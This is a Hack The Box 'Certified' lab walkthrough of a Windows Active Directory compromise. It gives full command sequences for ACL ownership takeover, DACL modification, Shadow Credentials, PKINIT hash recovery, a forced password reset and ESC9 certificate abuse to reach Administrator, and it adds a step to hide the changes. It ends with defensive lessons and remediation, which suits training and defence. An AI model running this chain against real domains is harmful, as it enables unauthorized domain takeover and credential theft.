# HTB - Certified

**Platform:** Hack The Box  
**Operating System:** Windows  
**Difficulty:** Medium  
**Primary Focus:** Active Directory ACL abuse, ownership takeover, Shadow Credentials, PKINIT, AD CS ESC9 abuse

---

## Executive Summary

Certified is a Windows Active Directory lab focused on modern identity abuse. The attack path relies less on classic password guessing and more on understanding AD object permissions, certificate-based authentication, and privilege relationships.

The compromise began with valid low-privileged credentials. BloodHound analysis revealed a chain of dangerous permissions that allowed object ownership changes, group control, and Shadow Credential abuse. That path produced authentication material for a higher-privileged account. Further AD CS analysis then identified a certificate abuse path involving ESC9-style behavior, allowing escalation through certificate-based authentication.

This walkthrough is valuable because it demonstrates the kind of AD reasoning that matters in real internal assessments: privileges, object control, authentication paths, and certificate infrastructure.

---

## Skills Demonstrated

- Authenticated Active Directory enumeration
- BloodHound attack path analysis
- AD object ownership abuse
- DACL manipulation
- Shadow Credential attacks
- Key credential link abuse
- PKINIT-based authentication
- NTLM hash recovery through certificate-based workflows
- Targeted account takeover
- AD CS enumeration
- ESC9-style certificate abuse
- Privilege escalation through certificate services

---

## Attack Path

```text
Initial Domain Credentials
        ↓
BloodHound Collection
        ↓
Dangerous ACL Path Identified
        ↓
Object Ownership Changed
        ↓
DACL Modified for Control
        ↓
Shadow Credentials Added
        ↓
PKINIT Authentication Performed
        ↓
management_svc Hash Recovered
        ↓
Control Path to ca_operator Identified
        ↓
ca_operator Password Reset
        ↓
AD CS Enumeration
        ↓
ESC9-Style Certificate Abuse
        ↓
Privileged Certificate Authentication
        ↓
Administrator-Level Access
```

---

## Walkthrough

### 1. Initial Enumeration

I began by validating the provided credentials and identifying accessible services.

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>'
nxc ldap <TARGET_IP> -u '<USER>' -p '<PASSWORD>'
```

The credentials were valid in the domain, which made authenticated AD enumeration the correct next step.

![Nmap service enumeration showing Active Directory services](https://github.com/user-attachments/assets/3d450477-a74d-497b-b96d-dacf1a0f743d)


---

### 2. BloodHound Collection

I collected domain relationship data.

```bash
bloodhound-python \
  -d <DOMAIN> \
  -u '<USER>' \
  -p '<PASSWORD>' \
  -ns <TARGET_IP> \
  -c All
```

BloodHound identified a chain involving object control and delegated rights.

![BloodHound path showing WriteOwner and GenericWrite relationship](https://github.com/user-attachments/assets/9f75d80d-89af-40a5-9972-eb0ff164c551)

 The key issue was not a single exploit. It was the combination of permissions that allowed one low-privileged identity to gain control over another identity.

---

### 3. Ownership Abuse

The path involved taking ownership of a target object.

```bash
bloodyAD \
  --host <DC_HOST> \
  -d <DOMAIN> \
  -u '<USER>' \
  -p '<PASSWORD>' \
  set owner '<TARGET_OBJECT>' '<CONTROLLED_USER>'
```

Changing ownership matters because object owners can often modify permissions on the object. That can turn indirect control into direct control.

---

### 4. DACL Modification

After ownership was changed, I modified the object's DACL to grant useful rights.

```bash
bloodyAD \
  --host <DC_HOST> \
  -d <DOMAIN> \
  -u '<USER>' \
  -p '<PASSWORD>' \
  add genericAll '<TARGET_OBJECT>' '<CONTROLLED_USER>'
```

This step converted object ownership into practical control.

![Group control granted through ownership and DACL changes](https://github.com/user-attachments/assets/83e0b353-2b33-456e-be7e-4c4f9fd180cf)


**Why this matters:** In Active Directory, privilege escalation often comes from permissions that look harmless in isolation. Ownership, write permissions, and group control can become account takeover paths when chained correctly.

---

### 5. Shadow Credential Attack

With sufficient control over the target account, I added a Shadow Credential.

```bash
pywhisker \
  -d <DOMAIN> \
  -u '<USER>' \
  -p '<PASSWORD>' \
  --target '<TARGET_ACCOUNT>' \
  --action add
```

This abuses the `msDS-KeyCredentialLink` attribute by adding attacker-controlled key material to the target account. Once added, the attacker can authenticate as that account using PKINIT.

![Shadow Credential attack executed with pywhisker](https://github.com/user-attachments/assets/445020c8-2150-461e-ba74-1bd4d5fdaf5b)


---

### 6. PKINIT Authentication

I used the generated certificate material to request a Kerberos TGT.

```bash
gettgtpkinit.py \
  -cert-pfx '<TARGET_ACCOUNT>.pfx' \
  -pfx-pass '<PFX_PASSWORD>' \
  '<DOMAIN>/<TARGET_ACCOUNT>' \
  target.ccache
```

![PKINIT TGT request after clock skew correction](https://github.com/user-attachments/assets/0931b573-328f-4fd0-a0c3-2e4d937da20c)


Then I used the Kerberos ticket to recover the NT hash where applicable in the lab workflow.

```bash
export KRB5CCNAME=target.ccache
getnthash.py '<DOMAIN>/<TARGET_ACCOUNT>' -key '<AS_REP_KEY>'
```

![NT hash recovered through PKINIT workflow](https://github.com/user-attachments/assets/98efc969-2c11-4b5c-8890-777a40922f7d)


This produced usable authentication material for the target account.

![WinRM access as management_svc validated](https://github.com/user-attachments/assets/55e2e59e-2f73-4870-a387-3dfd2e37a651)


---

### 7. Pivot to management_svc

The Shadow Credential path produced access to `management_svc`. I validated the resulting authentication material.

```bash
nxc smb <TARGET_IP> -u management_svc -H '<NT_HASH>'
```

At this point, I had moved from the initial user to a more privileged service account through AD object control rather than password guessing.

---

### 8. Control Path to ca_operator

Further BloodHound review showed that `management_svc` had a control path over `ca_operator`.

I reset the `ca_operator` password.

```bash
bloodyAD \
  --host <DC_HOST> \
  -d <DOMAIN> \
  -u management_svc \
  -p :'<NT_HASH>' \
  set password ca_operator '<NEW_PASSWORD>'
```

Then I validated the new credentials.

![ca_operator password reset successful](https://github.com/user-attachments/assets/23415309-3f97-4fd2-9e6e-31b3feae8432)


```bash
nxc ldap <TARGET_IP> -u ca_operator -p '<NEW_PASSWORD>'
```

---

### 9. AD CS Enumeration

With access to `ca_operator`, I enumerated certificate services.

```bash
certipy find \
  -u ca_operator@<DOMAIN> \
  -p '<NEW_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -enabled \
  -vulnerable
```

The enumeration identified an AD CS abuse path involving weak certificate mapping behavior consistent with ESC9-style abuse.

![Certificate template enumeration with Certipy](https://github.com/user-attachments/assets/2a9d2c0d-966e-4345-be32-68f88bfe1f85)


Important risk factors included:

- Certificate-based authentication was available.
- Certificate mapping behavior could be abused.
- The compromised account had the necessary access to interact with the certificate path.
- The attack could result in authentication as a higher-privileged identity.

---

### 10. Certificate Abuse and Privilege Escalation

I first modified the vulnerable account mapping so the certificate request would map to the privileged identity.

```bash
certipy account update \
  -username management_svc \
  -hashes :'<NT_HASH>' \
  -upn Administrator \
  -dc-ip <TARGET_IP> \
  -user ca_operator
```


![ca_operator UPN changed for certificate abuse](https://github.com/user-attachments/assets/a41bf04c-24bb-4163-9ed7-a19f9d89980a)

Then I requested certificate material from the vulnerable template.

```bash
certipy req \
  -u ca_operator@<DOMAIN> \
  -p '<NEW_PASSWORD>' \
  -ca '<CA_NAME>' \
  -template '<TEMPLATE_NAME>' \
  -dc-ip <TARGET_IP>
```


![Certificate requested from vulnerable template](https://github.com/user-attachments/assets/ca644a51-0514-427b-9fcc-d164ff246b38)

After the certificate was issued, I restored the account mapping to reduce obvious operational changes.

```bash
certipy account update \
  -username management_svc \
  -hashes :'<NT_HASH>' \
  -upn ca_operator \
  -dc-ip <TARGET_IP> \
  -user ca_operator
```


![ca_operator UPN restored after certificate request](https://github.com/user-attachments/assets/92e33eb1-c3ca-47be-b0dd-7a2146995aa2)

Then I authenticated with the issued certificate and recovered privileged authentication material.

```bash
certipy auth \
  -pfx '<CERTIFICATE>.pfx' \
  -dc-ip <TARGET_IP>
```


![Administrator hash recovered through certificate authentication](https://github.com/user-attachments/assets/b1df9eeb-8584-433b-ad17-253920ba04ff)

I validated the Administrator hash and used it to obtain an Administrator-level shell.


![Administrator hash validated with pass-the-hash](https://github.com/user-attachments/assets/34eab86c-32f0-413b-8bf5-d00b62a6feea)


![Administrator-level shell obtained](https://github.com/user-attachments/assets/c4549cc0-4fe6-427a-a6a7-cc077521e35d)

The resulting authentication material allowed privileged access and completed the escalation path.

---

## Key Lessons

- Authenticated AD enumeration often reveals more realistic attack paths than unauthenticated scanning.
- Dangerous ACLs can be more impactful than exposed passwords.
- Ownership control can lead to DACL modification, which can lead to account takeover.
- Shadow Credentials remain a high-impact AD technique when `msDS-KeyCredentialLink` can be modified.
- AD CS misconfigurations can convert account control into privileged authentication.
- Certificate-based identity paths need the same level of monitoring and hardening as passwords and Kerberos tickets.

---

## Remediation

- Review and remove unnecessary delegated rights over users, groups, and service accounts.
- Monitor for ownership changes on AD objects.
- Alert on suspicious DACL changes involving `GenericAll`, `GenericWrite`, `WriteOwner`, and `WriteDACL`.
- Monitor modifications to `msDS-KeyCredentialLink`.
- Restrict who can reset passwords for service accounts and certificate-related operators.
- Audit AD CS templates and certificate mapping settings for ESC9-style risk.
- Enforce strong certificate mapping where applicable.
- Monitor certificate requests involving privileged identities or unusual requester/template combinations.
